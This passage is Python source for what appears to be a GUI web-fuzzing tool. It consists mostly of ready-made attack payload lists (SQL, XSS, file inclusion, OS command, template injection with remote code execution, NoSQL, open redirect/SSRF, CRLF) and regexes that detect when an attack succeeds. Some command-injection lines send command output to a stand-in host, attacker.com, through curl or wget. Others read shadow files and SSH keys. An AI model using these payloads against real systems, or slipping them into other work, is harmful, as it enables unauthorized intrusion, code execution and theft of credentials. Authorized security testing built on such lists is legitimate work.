from __future__ import annotations

import re
import threading
import time

from PySide6.QtCore import Qt, QObject, Signal, Slot
from PySide6.QtGui import QColor
from PySide6.QtWidgets import (
    QAbstractItemView, QCheckBox, QComboBox, QFrame, QHBoxLayout,
    QHeaderView, QLabel, QLineEdit, QMessageBox, QPlainTextEdit,
    QProgressBar, QPushButton, QSpinBox, QSplitter, QTableWidget,
    QTableWidgetItem, QVBoxLayout, QWidget,
)

from net.http_client import send_raw_request
from net import http_message as hm
from ui.style import MONO, TEXT_DIM, decode, decode_http
from ui.highlighter import HTTPHighlighter

MARKER  = "§"
_HIT_BG = "#0e2a14"

_SQLI_PAYLOADS: list[str] = [
    # ── Probes básicos
    "'", "''", '"', '\\', '`', "';", "1'", '1"',
    # ── Boolean-based
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    '" OR "1"="1', '" OR 1=1--',
    "1' OR '1'='1", "1 OR 1=1", "' OR 'x'='x", "' OR ''='",
    "') OR ('1'='1", "')) OR (('1'='1",
    "' AND '1'='1", "' AND 1=1--", "' AND 1=2--",
    # ── Auth bypass
    "admin'--", "admin'#", "' OR 1=1 LIMIT 1--", "') OR 1=1--", "admin') --",
    # ── UNION-based
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
    "' UNION SELECT 1--", "' UNION SELECT 1,2--", "' UNION SELECT 1,2,3--",
    "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
    "' UNION SELECT @@version--", "' UNION SELECT user(),database()--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    # ── Error-based MySQL
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXP(~(SELECT * FROM (SELECT VERSION())a))--",
    # ── Error-based MSSQL
    "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    # ── Error-based PostgreSQL
    "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
    # ── Time-based MySQL
    "' AND SLEEP(5)--", "' AND SLEEP(5)#", "' OR SLEEP(5)--",
    "'; SLEEP(5)--", "' AND IF(1=1,SLEEP(5),0)--",
    "' AND IF(ASCII(SUBSTR(VERSION(),1,1))>50,SLEEP(5),0)--",
    "1; SELECT SLEEP(5)--", "1' AND SLEEP(5) AND '1'='1",
    # ── Time-based MSSQL
    "'; WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--",
    "'; IF 1=1 WAITFOR DELAY '0:0:5'--",
    # ── Time-based PostgreSQL
    "'; SELECT pg_sleep(5)--", "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--",
    # ── Time-based Oracle
    "' AND 1=dbms_pipe.receive_message('a',5) AND '1'='1",
    # ── Stacked queries
    "'; SELECT '1", "'; SELECT 1--", "1'; SELECT 1--",
    # ── Blind
    "' AND (SELECT COUNT(*) FROM users)>0--",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'--",
    # ── Out-of-band
    "' UNION SELECT LOAD_FILE('/etc/passwd')--",
    "'; EXEC xp_cmdshell('whoami')--",
    # ── Filter bypass
    "'/**/OR/**/1=1--", "' OR/**/1=1--", "'%20OR%201=1--",
    "' /*!OR*/ 1=1--", "' oR '1'='1",
    "' OR 0x313d31--", "' OR CHAR(49)=CHAR(49)--",
    # ── NoSQL
    '{"$gt": ""}', '{"$ne": null}', '{"$where": "sleep(5000)"}', "' || 1==1//",
]

_XSS_PAYLOADS: list[str] = [
    # ── Básico
    "<script>alert(1)</script>", "<script>alert('XSS')</script>",
    '<script>alert("XSS")</script>', "<script>prompt(1)</script>",
    "<script>confirm(1)</script>", "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    # ── Escapar atributos HTML
    '"><script>alert(1)</script>', "'><script>alert(1)</script>",
    '"><script>alert(1)</script><"', "';alert(1)//", '";alert(1)//',
    # ── Img onerror
    "<img src=x onerror=alert(1)>", '<img src=x onerror=alert("XSS")>',
    '"><img src=x onerror=alert(1)>', "<img/src=x onerror=alert(1)>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    # ── SVG
    "<svg onload=alert(1)>", "<svg/onload=alert(1)>",
    "<svg onload=alert(1)//", "<svg><script>alert(1)</script></svg>",
    "<svg><animatetransform onbegin=alert(1)>",
    # ── Body / eventos
    "<body onload=alert(1)>", "<body/onload=alert(1)>",
    # ── Input autofocus
    "<input onfocus=alert(1) autofocus>",
    "<input onblur=alert(1) autofocus><input autofocus>",
    # ── Video/Audio/Details
    "<video src=x onerror=alert(1)>", "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    # ── Iframe
    '<iframe src="javascript:alert(1)">', "<iframe onload=alert(1)>",
    # ── Links / URIs
    '<a href="javascript:alert(1)">X</a>',
    "javascript:alert(1)", "javascript:alert`1`",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    # ── Template injection
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
    "{{constructor.constructor('alert(1)')()}}",
    "{{this.constructor.constructor('alert(1)')()}}",
    # ── Case bypass
    "<SCRIPT>alert(1)</SCRIPT>", "<Script>alert(1)</Script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    # ── URL encoded
    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
    "%3Csvg%20onload%3Dalert%281%29%3E",
    # ── HTML entity encoded
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # ── Atributos sin comillas
    '" onmouseover="alert(1)', "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="', '" onclick="alert(1)',
    # ── DOM
    "#<script>alert(1)</script>",
    # ── Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\x3e",
    # ── MathML / select / textarea
    "<math><mtext><!--</mtext><script>alert(1)</script>-->",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
]

_LFI_PAYLOADS: list[str] = [
    # ── Rutas absolutas Unix
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
    "/etc/resolv.conf", "/etc/issue", "/etc/os-release", "/etc/motd",
    "/etc/group", "/etc/crontab", "/etc/fstab", "/etc/environment",
    "/etc/ssh/sshd_config", "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
    "/var/log/apache/access.log", "/var/log/nginx/access.log",
    "/var/log/nginx/error.log", "/var/log/auth.log", "/var/log/syslog",
    "/proc/version", "/proc/self/environ", "/proc/self/cmdline", "/proc/self/fd/0",
    "/root/.bash_history", "/root/.bashrc", "/root/.ssh/id_rsa",
    "/root/.ssh/authorized_keys", "/var/www/html/index.php",
    "/var/www/html/config.php", "/var/www/html/wp-config.php", "/var/www/html/.env",
    # ── Traversal relativo Unix (profundidades 1-10)
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../../../../../etc/passwd",
    "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd", "../../../../../../../../../etc/passwd",
    "../../../../../../../../../../etc/passwd",
    # ── Null byte (PHP legacy)
    "../etc/passwd%00", "../../etc/passwd%00",
    "../../../etc/passwd%00", "../../../../etc/passwd%00",
    "../etc/passwd%00.jpg", "../../etc/passwd%00.jpg",
    # ── URL encoded
    "%2e%2e%2fetc%2fpasswd", "%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2fetc%2fpasswd", "..%252fetc%252fpasswd",
    # ── Double URL encoded
    "%252e%252e%252fetc%252fpasswd", "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    # ── Puntos/slashes extra
    "....//etc/passwd", "....////etc/passwd", "..././etc/passwd",
    # ── PHP wrappers
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
    "expect://id", "file:///etc/passwd",
    # ── Windows
    "..\\windows\\win.ini", "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini", "..\\..\\..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini", "C:\\boot.ini",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "C:\\inetpub\\wwwroot\\web.config",
    "%WINDIR%\\win.ini", "%SYSTEMDRIVE%\\boot.ini",
    "..%5cwindows%5cwin.ini", "..%5c..%5cwindows%5cwin.ini",
    # ── Config comunes
    ".env", "../.env", "../../.env",
    "config.php", "../config.php", "../../config.php",
    "web.config", "../web.config",
]

_CMDI_PAYLOADS: list[str] = [
    # ── Probes básicos Unix
    ";id", "|id", "||id", "&id", "&&id", "`id`", "$(id)",
    ";id;", "|id|", ";whoami", "|whoami", "||whoami", "&whoami", "&&whoami",
    ";cat /etc/passwd", "|cat /etc/passwd", "&&cat /etc/passwd",
    ";uname -a", "|uname -a", "&&uname -a",
    ";hostname", "|hostname", "&&hostname",
    ";pwd", "|pwd", "&&pwd",
    ";ls -la", "|ls -la", "&&ls -la",
    ";ls -la /", "|ls -la /",
    ";env", "|env", "&&env",
    ";printenv", "|printenv",
    # ── Windows
    "|whoami", "&whoami", "&&whoami", "||whoami",
    "|ipconfig", "&ipconfig", "&&ipconfig /all",
    "|systeminfo", "&systeminfo",
    "|net user", "&net user",
    "|dir", "&dir C:\\",
    "|type C:\\Windows\\win.ini", "&type C:\\Windows\\win.ini",
    "|set", "&set",
    # ── Time-based (blind) Unix
    ";sleep 5", "|sleep 5", "&&sleep 5", "||sleep 5",
    ";sleep 5;", "$(sleep 5)", "`sleep 5`",
    # ── Time-based (blind) Windows
    "|timeout /t 5", "&timeout /t 5", "&&timeout /t 5",
    "|ping -n 5 127.0.0.1", "&ping -n 5 127.0.0.1",
    # ── Out-of-band Unix (cURL / wget)
    ";curl http://attacker.com/`id`", "|curl http://attacker.com/`whoami`",
    ";wget -q -O- http://attacker.com/`id`",
    # ── Redirección de salida
    ";id > /tmp/pwned", "|id > /tmp/pwned",
    # ── URL encoded
    "%3Bid", "%7Cid", "%26id", "%3Bwhoami", "%7Cwhoami",
    "%3Bcat%20%2Fetc%2Fpasswd", "%7Ccat%20%2Fetc%2Fpasswd",
    # ── Newline injection
    "%0aid", "%0aid%0a", "%0a/usr/bin/id", "%0awhoami",
    "%0d%0aid", "\nid", "\r\nid",
    # ── IFS bypass
    "${IFS}id", "a${IFS}id", ";${IFS}id",
    # ── Comillas / bypass de filtros
    "';id;'", '";id;"', "';id#", '";id#',
    "' ; id", '" ; id',
    "'|id", '"|id',
    # ── Subshell
    "$(cat /etc/passwd)", "$(uname -a)", "$(hostname)",
    "`cat /etc/passwd`", "`uname -a`", "`hostname`",
    # ── Específicos de lenguajes/frameworks
    "| cat /etc/passwd",          # espacio antes de |
    "1; cat /etc/passwd",
    "1 | cat /etc/passwd",
    "1 && cat /etc/passwd",
    "1 || cat /etc/passwd",
    "; cat /etc/shadow",
    "| cat /etc/shadow",
]


_SQLI_DETECT: list[tuple[str, str]] = [
    (r"SQL syntax.*MySQL",                       "MySQL syntax error"),
    (r"Warning.*mysql_",                         "MySQL PHP warning"),
    (r"valid MySQL result",                      "MySQL result error"),
    (r"check the manual that corresponds to your MySQL", "MySQL manual ref"),
    (r"MySqlException",                          "MySqlException"),
    (r"ORA-\d{5}",                               "Oracle ORA error"),
    (r"Oracle error",                            "Oracle error"),
    (r"Microsoft OLE DB Provider for SQL",       "MSSQL OLE DB error"),
    (r"ODBC.*SQL Server",                        "MSSQL ODBC error"),
    (r"Unclosed quotation mark",                 "MSSQL unclosed quote"),
    (r"Incorrect syntax near",                   "MSSQL syntax error"),
    (r"SqlException",                            ".NET SqlException"),
    (r"pg_query\(\)",                            "PostgreSQL pg_query"),
    (r"PostgreSQL.*ERROR",                       "PostgreSQL error"),
    (r"Warning.*pg_",                            "PostgreSQL PHP warning"),
    (r"SQLITE_ERROR",                            "SQLITE_ERROR"),
    (r"SQLiteException",                         "SQLiteException"),
    (r"Dynamic SQL Error",                       "Firebird SQL error"),
    (r"SQL command not properly ended",          "Oracle SQL error"),
    (r"quoted string not properly terminated",   "Oracle quote error"),
    (r"Syntax error.*in query expression",       "Access syntax error"),
    (r"Microsoft Access Driver",                 "MS Access error"),
    (r"Data type mismatch",                      "Access type mismatch"),
    (r"JDBC.*SQLException",                      "JDBC SQL error"),
    (r"com\.mysql\.jdbc",                        "MySQL JDBC"),
    (r"org\.postgresql",                         "PostgreSQL JDBC"),
]

_XSS_DETECT: list[tuple[str, str]] = [
    (r"<script[^>]*>alert",         "script+alert reflejado"),
    (r"onerror\s*=\s*alert",        "onerror=alert reflejado"),
    (r"onload\s*=\s*alert",         "onload=alert reflejado"),
    (r"javascript\s*:\s*alert",     "javascript:alert reflejado"),
    (r"<svg[^>]*onload",            "SVG onload reflejado"),
    (r"<img[^>]*onerror",           "img onerror reflejado"),
    (r"alert\(1\)",                 "alert(1) reflejado"),
    (r"alert\(['\"]XSS['\"]",      "alert('XSS') reflejado"),
    (r"confirm\(1\)",               "confirm(1) reflejado"),
    (r"prompt\(1\)",                "prompt(1) reflejado"),
]

_LFI_DETECT: list[tuple[str, str]] = [
    (r"root:x?:\d+:\d+:",              "/etc/passwd — root"),
    (r"nobody:x?:\d+:\d+:",            "/etc/passwd — nobody"),
    (r"daemon:x?:\d+:\d+:",            "/etc/passwd — daemon"),
    (r"\[boot loader\]",               "boot.ini content"),
    (r"\[operating systems\]",         "boot.ini OS section"),
    (r"for 16-bit app support",        "win.ini content"),
    (r"\[fonts\]",                     "win.ini [fonts]"),
    (r"\[extensions\]",                "win.ini [extensions]"),
    (r"Linux version \d",              "/proc/version"),
    (r"DOCUMENT_ROOT\s*=",             "/proc/self/environ"),
    (r"HTTP_USER_AGENT\s*=",           "/proc/self/environ"),
    (r"-----BEGIN (?:RSA |EC |)PRIVATE KEY", "SSH private key"),
    (r"uid=\d+\(\w+\) gid=\d+",       "Unix id output"),
    (r"DB_PASSWORD\s*=",               ".env credentials"),
    (r"DB_HOST\s*=",                   ".env DB host"),
    (r"SECRET_KEY\s*=",                ".env secret key"),
    (r"APP_KEY\s*=",                   ".env app key"),
    (r"volume serial number",          "Windows drive info"),
]

_CMDI_DETECT: list[tuple[str, str]] = [
    (r"uid=\d+\(\w+\)\s+gid=\d+",         "id — Unix"),
    (r"root:x?:\d+:\d+:",                  "cat /etc/passwd"),
    (r"daemon:x?:\d+:\d+:",                "cat /etc/passwd"),
    (r"Linux\s+\S+\s+\d+\.\d+",            "uname -a"),
    (r"#\s+\w.*kernel",                    "uname -a kernel"),
    (r"sh:\s*/\S+:\s*not found",           "shell error"),
    (r"/bin/sh:\s*\d+:",                   "sh error"),
    (r"\b(bash|sh|zsh|fish|ksh|tcsh)\b",  "shell name"),
    (r"DOCUMENT_ROOT=",                    "env var dump"),
    (r"PATH=/\S+",                         "PATH env var"),
    (r"HOME=/(?:root|home/\w+)",           "HOME env var"),
    (r"Windows IP Configuration",          "ipconfig"),
    (r"Subnet Mask\s*[\.:]",              "ipconfig detail"),
    (r"Volume in drive [A-Z]",             "dir output"),
    (r"Directory of [A-Z]:\\",             "dir output Windows"),
    (r"Host Name\s*:\s*\S+",              "systeminfo"),
    (r"OS Version\s*:\s*Microsoft",        "systeminfo"),
    (r"Administrator\s+\S+\s+\d{2}/\d{2}/\d{4}", "net user admin"),
    (r"for 16-bit app support",            "win.ini — cmd injection"),
    (r"\[extensions\]",                    "win.ini — cmd injection"),
    (r"command not found",                 "cmd ejecutado (error)"),
    (r"Permission denied",                 "cmd ejecutado (denegado)"),
    (r"No such file or directory",         "cmd ejecutado (no existe)"),
]

# ── SSTI ──────────────────────────────────────────────────────

_SSTI_PAYLOADS: list[str] = [
    # Probes matemáticos — resultado único por motor
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
    "{{7*'7'}}", "${7*'7'}", "{{234*567}}", "${234*567}",
    "[[7*7]]", "@(7*7)", "{{7**7}}",
    # Jinja2 / Flask — info leak
    "{{config}}", "{{config.items()}}", "{{self}}", "{{request}}",
    "{{request.environ}}", "{{lipsum.__globals__}}",
    "{{''.__class__}}", "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{'%s%s%s%s%s%s%s%s%s%s'%('a','a','a','a','a','a','a','a','a','a')}}",
    # Jinja2 — sandbox escape
    "{{''.__class__.__bases__[0].__subclasses__()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    # Twig (PHP)
    "{{_self}}", "{{_self.env}}", "{{dump(app)}}",
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{{app.request.server.all|json_encode}}",
    # FreeMarker (Java)
    "${.data_model}", "${.globals}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('id')}",
    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('whoami')}",
    # Velocity (Java)
    "#set($e='')$e.getClass().forName('java.lang.Runtime').getMethod('exec',''.class).invoke($e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')",
    # Smarty (PHP)
    "{$smarty.version}", "{php}echo 'id';{/php}", "{system('id')}",
    "{if system('id')}{/if}", "{'id'|shell_exec}",
    # Mako (Python)
    "${''.__class__}", "${self.module.cache.util.os.system('id')}",
    '<%\nimport os\nx=os.popen("id").read()\n%>\n${x}',
    # Pebble (Java)
    '{% for i in range(3) %}{{ i }}{% endfor %}',
    # Tornado (Python)
    "{% import os %}{{ os.popen('id').read() }}",
    # Thymeleaf (Java)
    "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::.x",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    # Groovy / Grails
    "${'id'.execute().text}", '${["id"].execute().text}',
    # ERB (Ruby)
    "<%= `id` %>", "<%= system('id') %>", "<%= 7*7 %>",
    # Handlebars (Node)
    "{{#with 'constructor'}}{{#with split as |a|}}{{a.pop}}{{/with}}{{/with}}",
    "{{#each constructor.prototype}}{{@key}}{{/each}}",
    # Nunjucks (Node)
    "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id').toString()\")()}}",
    # AngularJS (client-side)
    "{{constructor.constructor('alert(1)')()}}",
    # Error probes (provocar mensajes de error del motor)
    "{{undefined}}", "${undefined}", "<%=undefined%>",
    '${"a"*"b"}', '{{"a"*"b"}}', "{{<>}}", "${<>}",
    "{{1/0}}", "${1/0}", "#{{1/0}}",
]

_SSTI_DETECT: list[tuple[str, str]] = [
    (r"\b49\b",                        "SSTI: 7*7=49 evaluado"),
    (r"7777777",                       "SSTI: 7*'7'=7777777 (Jinja2)"),
    (r"132678",                        "SSTI: 234*567=132678"),
    (r"823543",                        "SSTI: 7**7=823543"),
    (r"uid=\d+\(\w+\)\s+gid=",        "SSTI → RCE: id ejecutado"),
    (r"jinja2\.exceptions\.",          "Jinja2 exception"),
    (r"TemplateSyntaxError",           "Template syntax error"),
    (r"UndefinedError",                "Jinja2 UndefinedError"),
    (r"jinja2\.",                      "Jinja2 class leaked"),
    (r"FreeMarker template error",     "FreeMarker error"),
    (r"freemarker\.core\.",            "FreeMarker class leaked"),
    (r"freemarker\.template\.",        "FreeMarker template class"),
    (r"org\.apache\.velocity",         "Velocity class leaked"),
    (r"velocity\.runtime\.",           "Velocity runtime"),
    (r"Smarty.*Compile.*Error",        "Smarty compile error"),
    (r"smarty_error",                  "Smarty error"),
    (r"Mako RuntimeError",             "Mako error"),
    (r"mako\.exceptions\.",            "Mako exception"),
    (r"ThymeleafException",            "Thymeleaf exception"),
    (r"org\.thymeleaf\.",              "Thymeleaf class leaked"),
    (r"PebbleException",               "Pebble exception"),
    (r"TemplateNotFoundException",     "Template not found"),
    (r"<Template\s+",                  "Template object leaked"),
    (r"groovy\.lang\.",                "Groovy class leaked"),
    (r"ActionView::Template::Error",   "Rails/ERB error"),
    (r"Handlebars\s+Error",            "Handlebars error"),
    (r"nunjucks",                      "Nunjucks reference"),
    (r"\[object Object\]",             "JS object leaked"),
]

# ── Open Redirect ─────────────────────────────────────────────

_REDIRECT_PAYLOADS: list[str] = [
    # Básicos con host destino reconocible
    "https://evil.com", "http://evil.com", "//evil.com", "//evil.com/",
    "///evil.com", "////evil.com", "/////evil.com",
    # Backslash bypass
    "\\\\evil.com", "\\/evil.com", "/\\evil.com", "\\evil.com",
    # Credenciales @ (abuso de URL)
    "https://legit.com@evil.com", "//legit.com@evil.com",
    "https://evil.com@legit.com",
    # Encoding
    "%68%74%74%70%73%3a%2f%2fevil.com",  # https://evil.com hex
    "https://evil%E3%80%82com",            # Unicode dot
    "https://evil。com",
    "%2f%2fevil.com", "%2fevil.com",
    "https%3A%2F%2Fevil.com",
    # Double encode
    "%252f%252fevil.com", "//evil.com%00",
    # Protocolos alternativos
    "javascript:alert(1)", "javascript://comment%0aalert(1)",
    "javascript:void(0);https://evil.com",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    # Null byte / fragmento
    "https://evil.com#", "https://evil.com?",
    "https://evil.com#.legit.com", "https://evil.com?.legit.com",
    # Case bypass
    "HTTP://evil.com", "HTTPS://evil.com", "HtTpS://evil.com",
    "Http://evil.com",
    # Relative paths
    "/%09/evil.com", "/.evil.com",
    "//evil.com/%2f..", "/redirect?url=//evil.com",
    # SSRF hybrid
    "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
    "http://[::1]", "http://169.254.169.254/latest/meta-data/",
    "http://192.168.1.1", "http://10.0.0.1",
    # Schema-less
    "//", "///", "/////",
    # CRLF combinado
    "%0d%0aLocation: https://evil.com",
    "%0aLocation: https://evil.com",
]

_REDIRECT_DETECT: list[tuple[str, str]] = [
    (r"(?i)^Location:\s*https?://evil\.com",      "Redirect a evil.com"),
    (r"(?i)^Location:\s*//evil\.com",             "Redirect relativo a evil.com"),
    (r"(?i)^Location:\s*\\\\evil\.com",           "Redirect backslash a evil.com"),
    (r"(?i)^Location:\s*javascript:",             "Redirect javascript:"),
    (r"(?i)^Location:\s*data:",                   "Redirect data:"),
    (r"(?i)^Location:\s*vbscript:",               "Redirect vbscript:"),
    (r"(?i)^Location:\s*http://127\.",            "SSRF → 127.x"),
    (r"(?i)^Location:\s*http://localhost",        "SSRF → localhost"),
    (r"(?i)^Location:\s*http://169\.254",         "SSRF → metadata AWS"),
    (r"(?i)^Location:\s*http://(?:10|192\.168)\.", "SSRF → red interna"),
    (r"evil\.com",                                "evil.com en respuesta"),
    (r"(?i)HTTP/\d\.\d\s+30[12378]\b",           "Redirect 3xx recibido"),
]

# ── NoSQL Injection ───────────────────────────────────────────

_NOSQL_PAYLOADS: list[str] = [
    # MongoDB — operator injection en query params (?key[op]=val)
    "[$ne]=1", "[$ne]=invalid", "[$gt]=", "[$gte]=", "[$lt]=z", "[$lte]=z",
    "[$exists]=true", "[$regex]=.*", "[$in][]=1",
    "[$where]=1==1", "[$where]=true",
    # JSON body — objetos con operadores
    '{"$ne": null}', '{"$ne": "invalid"}',
    '{"$gt": ""}', '{"$gte": ""}', '{"$lt": "z"}',
    '{"$exists": true}', '{"$regex": ".*"}',
    '{"$in": [""]}', '{"$nin": []}',
    '{"$where": "this.a == this.a"}',
    '{"$where": "1==1"}',
    # Auth bypass completo (usuario + contraseña)
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": {"$exists": true}, "password": {"$exists": true}}',
    '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
    # Param-style auth bypass
    "username[$ne]=invalid&password[$ne]=invalid",
    "username[$exists]=true&password[$exists]=true",
    "username[$gt]=&password[$gt]=",
    "username[$regex]=.*&password[$regex]=.*",
    # JS injection ($where)
    "'; return true; var x='", "'; return '1'=='1",
    "' || '1'=='1", "' || true //",
    "'; return true; //", '"|| ""=="',
    # Time-based blind (sleep)
    '{"$where": "sleep(5000)"}',
    '{"$where": "function(){var d=new Date();var t=d.getTime();while(new Date().getTime()<t+5000){}return true;}"}',
    # Aggregation pipeline abuse
    '{"$lookup": {"from": "users", "localField": "id", "foreignField": "_id", "as": "r"}}',
    # Redis CRLF injection
    "\r\nSET injected value\r\n", "%0d%0aSET injected value%0d%0a",
    # CouchDB
    '{"selector": {"_id": {"$gt": null}}}',
    # Elasticsearch
    '{"query": {"match_all": {}}}',
    '{"query": {"bool": {"must": [{"match_all": {}}]}}}',
    # Array injection
    "username[]=admin&username[]=guest",
    # Operator confusion
    '{"password": {"$regex": "^a"}}', '{"password": {"$regex": "^b"}}',
]

_NOSQL_DETECT: list[tuple[str, str]] = [
    (r"MongoError",                        "MongoDB error"),
    (r"MongoNetworkError",                 "MongoDB network error"),
    (r"MongoServerSelectionError",         "MongoDB server error"),
    (r"MongooseServerSelectionError",      "Mongoose error"),
    (r"mongo.*[Ee]xception",              "MongoDB exception"),
    (r"BSONTypeError",                     "BSON type error"),
    (r"BSONObjectIdError",                 "BSON ObjectId error"),
    (r"CastError.*ObjectId",               "Mongoose CastError"),
    (r'"name"\s*:\s*"MongoError"',         "MongoDB error JSON"),
    (r"failed to parse",                   "MongoDB parse error"),
    (r"unknown operator",                  "MongoDB unknown operator"),
    (r"\$where",                           "$where reflejado"),
    (r"can't convert.*to [Ss]tring",      "Type conversion error"),
    (r"ReferenceError.*is not defined",    "JS ReferenceError ($where)"),
    (r"SyntaxError.*unexpected",           "JS SyntaxError ($where)"),
    (r"WRONGTYPE Operation",               "Redis WRONGTYPE error"),
    (r"ERR.*wrong.*arguments",             "Redis argument error"),
    (r"NOAUTH Authentication required",    "Redis NOAUTH"),
    (r'"hits"\s*:\s*\{.*"total"',         "Elasticsearch response"),
    (r'"_shards"',                         "Elasticsearch shards"),
    (r"Unrecognized pipeline stage",       "MongoDB pipeline error"),
    (r"Unexpected end of JSON",            "JSON parse error"),
]

# ── CRLF / Header Injection ───────────────────────────────────

_CRLF_PAYLOADS: list[str] = [
    # Básico — inyección de cabecera arbitraria
    "%0d%0aX-Injected: pwned",
    "%0aX-Injected: pwned",
    "%0d%0aX-Injected:%20pwned",
    "%0d%0a%09X-Injected: pwned",    # tab después del CRLF
    # Double-encoded
    "%250d%250aX-Injected: pwned",
    "%25%30%64%25%30%61X-Injected: pwned",
    # Unicode CRLF
    "%E5%98%8D%E5%98%8AX-Injected: pwned",
    "\r\nX-Injected: pwned",
    "\nX-Injected: pwned",
    # Cookie injection
    "%0d%0aSet-Cookie: injected=1; Path=/",
    "%0aSet-Cookie: injected=1; Path=/",
    "%0d%0aSet-Cookie: session=evil; HttpOnly; Secure",
    "%250d%250aSet-Cookie: injected=1",
    # Location / redirect
    "%0d%0aLocation: https://evil.com",
    "%0aLocation: https://evil.com",
    "%0d%0aLocation:%20https://evil.com",
    # XSS vía response splitting
    "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
    "%0aContent-Type: text/html%0a%0a<script>alert(1)</script>",
    # Cache poisoning
    "%0d%0aX-Cache-Status: HIT",
    "%0d%0aX-Forwarded-For: 127.0.0.1",
    "%0d%0aX-Real-IP: 127.0.0.1",
    # CSP bypass
    "%0d%0aContent-Security-Policy: default-src *",
    "%0d%0aContent-Security-Policy-Report-Only: default-src *",
    # Refresh redirect
    "%0d%0aRefresh: 0; url=https://evil.com",
    # CORS abuse
    "%0d%0aAccess-Control-Allow-Origin: *",
    "%0d%0aAccess-Control-Allow-Credentials: true",
    # Multiple headers
    "%0d%0aX-A: 1%0d%0aX-B: 2",
    # Header value splitting (sin nueva línea)
    "test\r\nX-Injected: pwned",
    "test\nX-Injected: pwned",
    # En campo Host o Referer (log poisoning)
    "%0d%0aReferer: https://evil.com",
    # Null byte + CRLF
    "%00%0d%0aX-Injected: pwned",
]

_CRLF_DETECT: list[tuple[str, str]] = [
    (r"(?m)^X-Injected:\s*pwned",              "Header X-Injected inyectado"),
    (r"(?m)^Set-Cookie:\s*injected=",          "Cookie 'injected' inyectada"),
    (r"(?m)^Set-Cookie:\s*session=evil",       "Session cookie inyectada"),
    (r"(?m)^Location:\s*https?://evil\.com",   "Location → evil.com inyectado"),
    (r"(?m)^Refresh:\s*0;\s*url=https://evil\.com", "Refresh redirect inyectado"),
    (r"(?m)^Content-Security-Policy:\s*default-src \*", "CSP sobreescrito"),
    (r"(?m)^X-Cache-Status:\s*HIT",            "X-Cache-Status inyectado"),
